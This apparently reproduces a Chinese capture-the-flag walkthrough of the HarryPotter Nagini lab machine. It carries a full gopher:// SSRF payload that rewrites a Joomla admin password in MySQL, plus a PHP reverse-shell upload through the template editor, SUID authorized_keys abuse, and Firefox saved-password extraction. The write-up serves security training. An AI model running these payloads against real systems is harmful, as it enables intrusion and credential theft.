---
title: 【微信】从http3协议利用到ssrf服务端请求伪造，从joomla后台反弹shell到suid提权--靶机练习之HarryPotter_Nagini
source: https://mp.weixin.qq.com/s/mRZGf9ZGrZUW47ywpO1I-g
source_host: mp.weixin.qq.com
clip_date: 2026-10-16T15:17:30+08:00
trace_id: c51c484a-c1c5-4801-9d04-2adb881f51dc
content_hash: 211007613f57e1533e09a30196d7d80fc1a1e6ea28c0e9e1bdbc4db85507b5bc
status: synced
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 从 Joomla 配置备份泄露到 SSRF+gopher 改库登后台写马，再经 SUID 与浏览器密码还原拿下 root。
ai_summary_style: key-points
images_status:
  total: 54
  succeeded: 54
  failed_urls: []
notion_page_id: 3fb75244-d011-8128-8261-e7dd37019055
ioc:
  cves: []
  cwes: []
  hashes:
    - e10adc3949ba59abbe56e057f20f883e
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 从 Joomla 配置备份泄露到 SSRF+gopher 改库登后台写马，再经 SUID 与浏览器密码还原拿下 root。
> 
> - **端口与指纹：** nmap 仅开 22/80，靶机为 Debian+Apache；dirb/gobuster 识别出 Joomla，note.txt 泄露 http3 地址与管理员账号 site_admin。
> - **http3 兼容坑：** 靶机 QUIC 只支持到 draft29（版本号前缀 0xff00001d），新版 quiche 客户端连不上，需改用 aioquic 0.9.21 的 http3 客户端才能访问隐藏内容。
> - **配置备份泄露：** 按提示扫 bak 后缀下载 joomla/configuration.php.bak，得数据库用户 goblin（密码为空）及一个密钥。
> - **SSRF 到 getshell：** 隐藏目录存在 SSRF，file 协议可读文件；用 Gopherus 构造 gopher 协议语句直连 3306，把 site_admin 密码改为 md5(123456)，登录后台后在模板写入 php-reverse-shell 反弹 shell。
> - **提权链：** snape 家目录凭证经 base64 解码登录；SUID 的 su_cp 覆写 authorized_keys 实现 hermoine 免密登录拿 flag；最后 scp 回 Firefox 配置，用 firefox_decrypt 还原 root 密码。

**百炼G33K** *2026年10月16日 14:56*

## 信息搜集

### 端口探测

```
nmap -sn 192.168.8.0/24
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/42ccaa28b0d3edfe.png)

```
nmap -sT --min-rate 10000 192.168.8.16 -p-
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/427bfc5b9f8c8cc4.png)

> 只开了两个端口22，80

```
nmap -sT -sC -sV -O 192.168.8.16 -p22,80
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/375d62b9106ca5fe.png)

> debian系统、apache服务

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ea24294deb88d878.png)

### 目录扫描

```
dirb http://192.168.8.16/
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/dc6b1819fe2310ae.png)

> 发现是joomlaCMS框架

```
gobuster dir -u http://192.168.8.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,bak
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/966a46befaa27519.png)

> 继续深度扫描了一下泄露的文件，有个note.txt

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d3eb66b357929185.png)

> 提示了一个http3的url地址和一个网站管理员site_admin

### http3配置

> http3需要使用quiche进行连接，使用quiche我们需要先安装下rust

> 安装rust环境,一键默认就行

```
curl https://sh.rustup.rs -sSf | sh
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/481e99fe3cd94692.png)

> 下载安装quiche

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8c3530518294bbe9.png)

```bash
git clone https://github.com/cloudflare/quiche.git
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/726ede557dd732ba.png)

> 构建项目(初次安装rust需要重启一下终端才能加载相关命令的环境变量)

```bash
cargo build --examples
```

```bash
cargo test
```

> 环境搭建好后进入quiche/target/debug/examples目录，然后利用http3进行访问

```
./http3-client https://quic.nginx.org/
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7c8dca7ad607545e.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b9463049e4a656a0.png)

> 测试网站正常能够http3访问，靶机的地址无回显

> PS:这里有一个坑，靶机的http3版本协议很老，新的连接不上 这边先抓包看一下靶机的http3版本

```
tcpdump -i eth0 -X 'udp and host 192.168.8.16 and port 443' & curl -sk --http3-only https://quic.nagini.hogwarts/
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f8c1f7f3f3bc70e1.png)

> 每个回包的结尾都是有特征的，这也泄露了其支持的版本号 0xff0000xx 前缀是 IETF QUIC draft 版的专属编码,规则是 0xff000000 + draft号:

```
ff 0000 1d------>29
ff 0000 1c------>28
ff 0000 1b------>27
```

> 支持的版本最新到draft29,搜索历史版本，查找支持协议的安装包

```
curl -s https://raw.githubusercontent.com/aiortc/aioquic/0.9.21/src/aioquic/h3/connection.py |grep H3_ALPN
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ecb30e7f97a4c656.png)

> 创建python虚拟环境

```
python3 -m venv ./h3draft-venv
./h3draft-venv/bin/pip install "aioquic==0.9.21" wsproto
```

> http3连接,读取隐藏内容

```
./h3draft-venv/bin/python http3_client.py --insecure --output-dir ./ https://quic.nagini.hogwarts
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0d55010691404419.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f9364fafdba9fb78.png)

> 提示有一个隐藏的目录,和一个备份文件

## 备份文件扫描

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f9364fafdba9fb78.png)

> 之前提示有一个bak结尾的configuration的备份文件，这个系统是php的搭建的我们也加上.php.bak

```
gobuster dir -u http://192.168.8.16/joomla/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x bak,php.bak
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1fbe915eba08f678.png)

```
wget http://192.168.8.16/joomla/configuration.php.bak
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3a4bf3e814213f07.png)

> 数据库用户名为goblin,密码为空；同事还拿到了一个密钥 =======

## joomla备份文件泄露

> joomla架构，正好对应着配置文件的备份文件

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d76a40cf7fa46b0e.png)

> 数据库密码为空

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8efe51ce0a82cf4a.png)

## ssrf服务端请求伪造利用

### 探测

> 另外一个是隐藏目录，功能是测试内网页面资源的

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/061aa3d7db318796.png)

> 传入127.0.0.1，发现回显了首页的页面

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2da2fd9f68fa447a.png)

> 传入file协议，能够读取文件，说明存在服务端请求伪造漏洞

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d5463b6596484e3d.png)

### 利用gopher协议攻击mysql

> 根据上面获取的信息，靶机上存在一个数据库服务，数据库类型是mysql

```
python2 gopherus.py --exploit mysql
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/74ff57067d3739f1.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0be8b2baf5590f86.png)

> 需要把payload写成一句话

```r
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%17%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%73%68%6f%77%20%74%61%62%6c%65%73%01%00%00%00%01
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b1e807744bcb9273.png)

> 找到用户表

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4ffda4a25345f5c7.png)

> 确定字段，username,password

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/719f2ed24f31812f.png)

> 查密码

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/04c44af544ca1b67.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/24b4dd34e7cd0c40.png)

### 注入md5加密的新密码

```
$2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D/bkoTmbWWqFWjzEW7vay
```

> 不是典型的哈希加密

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ee3eae850068ee32.png)

> 提取加密密码，这个特征明显是 **bcrypt 密码哈希**，典型由 PHP 的 `password_hash($password, PASSWORD_BCRYPT)` 或 `crypt()` 生成，需要一个盐值才能尝试去碰撞，难度非常大，这边果断直接注入新的密码，因为mysql也支持md5加密的密码，这边直接用MD5加密的密码

```
echo -n "123456" | md5sum
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c61e9365768b528b.png)

> 注入payload

```
use joomla;update joomla_users set password='e10adc3949ba59abbe56e057f20f883e' where username='site_admin'
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1512c2fb3d85c4f8.png)

> 成功登录后台

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9245766a0b78368a.png)

## joomla 后台木马注入反弹shell

> 找到template模块

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1b4773a6e149fdcb.png)

> 利用一下kali自带的反弹shell脚本

```
locate php-reverse
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/147547de96da28d8.png)

> 写入

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/18a2553578c76716.png)

> 成功反弹shell

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/131f7c50c2393371.png)

## 提权

> 先升级一下shell

```
/bin/bash -i 
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/246c0b579dbb4026.png)

### 敏感信息利用

> 在家目录snape用户下找到一个凭证

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/653a0fe0850c72f6.png)

> base64解码一下

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/11c395b6dfc53929.png)

> 成功登录snape

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/bdcddb6029ec6d0a.png)

### suid提权

```
find / -perm -u=s -type f 2>/dev/null
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e1807f36a0553242.png)

> 感觉像是一个cp复制命令

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/627f07eb395e9e9e.png)

> kali伪造ssh密钥

```
ssh-keygen
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6ffc53767dbba955.png)

> 把公钥上传到靶机

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/093dba995df03dbe.png)

> 设置一下密钥的权限（本机600，靶机640）和位置

```
/home/hermoine/bin/su_cp -p  authorized_keys /home/hermoine/.ssh/
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/fad40cc82a1c70ac.png)

> 拿到flag

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/377cb6353d73736e.png)

### 浏览器密码还原

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/14e0a8b07a31913a.png)

> 有一个火狐浏览器配置文件目录，这里需要用到火狐解密工具

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3c74aaec75ab576d.png)

```
https://github.com/unode/firefox_decrypt.git
```

> 把文件下载到kali

```ruby
scp -rp hermoine@192.168.110.129:/home/hermoine/.mozilla /tmp
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/32eaeb6057ef8d9c.png)

```
python firefox_decrypt.py /tmp/.mozilla/firefox
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d3cfb5f728870b80.png)

> 拿到root密码，成功拿到最后的flag

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/80e428b7e3722ddd.png)

靶机记录 · 目录
